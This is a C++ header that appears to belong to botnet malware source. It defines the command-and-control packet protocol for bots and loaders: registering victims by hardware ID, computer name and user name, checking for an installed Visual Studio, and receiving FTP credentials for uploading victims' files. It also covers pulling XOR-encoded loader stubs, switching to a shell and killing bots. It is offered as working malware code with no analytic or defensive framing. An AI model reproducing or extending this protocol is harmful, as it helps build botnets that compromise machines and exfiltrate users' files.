#pragma once
#include "common.h"
#include "encoder.h"
#include <random>

enum packet_opcode
	: unsigned char
{
	// bot packets
	bot_register
	, bot_register_ok
	, file_upload_ack
	, kill_bot
	, request_speedtest			// cnc -> bot
	, request_speedtest_ack		// bot -> cnc + 1000000 bytes
	, request_speedtest_result	// bot -> cnc

	, loader_push_update
	, loader_register
	, loader_register_ok
	, loader_request_stub
	, loader_request_stub_ack
	, loader_request_stub_data
	, loader_request_stub_end
	, shell_switch
};


struct net_packet
{
	packet_opcode opcode;
	unsigned short packet_size;
};

struct request_speedtest_result_payload
{
	unsigned int elapsed_ms;
};

struct loader_request_stub_end_payload
{
	unsigned char md5_checksum[16];
};

struct loader_register_ok_payload
{
	unsigned long long new_crypto_key;
};

struct loader_request_stub_data_payload
{
	char data[100];
	unsigned int data_size;
	unsigned long long data_crypto_key;

	void toggle_data_encoding()	{ xor_encode((unsigned char*)data, data_size, data_crypto_key); }

	void assign_data(void* stub_data, unsigned int stub_data_size)
	{
		memset(data, 0x00, stub_data_size);
		memcpy(data, stub_data, stub_data_size);
		data_size = stub_data_size;
		data_crypto_key = std::uniform_int_distribution<unsigned long long>()(std::mt19937_64(std::random_device()()));
	}
#ifdef _DEBUG
	int current_cnt;
	int total_cnt;
#endif // _DEBUG

};

struct loader_request_stub_ack_payload
{
	int stub_size;
};

struct bot_register_payload
{
	unsigned long long hwid;
	char computer_name[50];
	char user_name[50];
	bool vs_installed_flag;

#ifdef CPP_SCANNER_CLIENT
	bot_register_payload();
#endif // CPP_SCANNER_CLIENT
};

struct bot_register_ok_payload
{
	unsigned long long crypto_key;
	char ftp_server_ip[16];
	unsigned short ftp_server_port;
	char ftp_server_username[100];
	char ftp_server_password[100];
};

struct file_upload_ack_payload
{
	char file_local_path[256];
	char file_remote_path[256];
};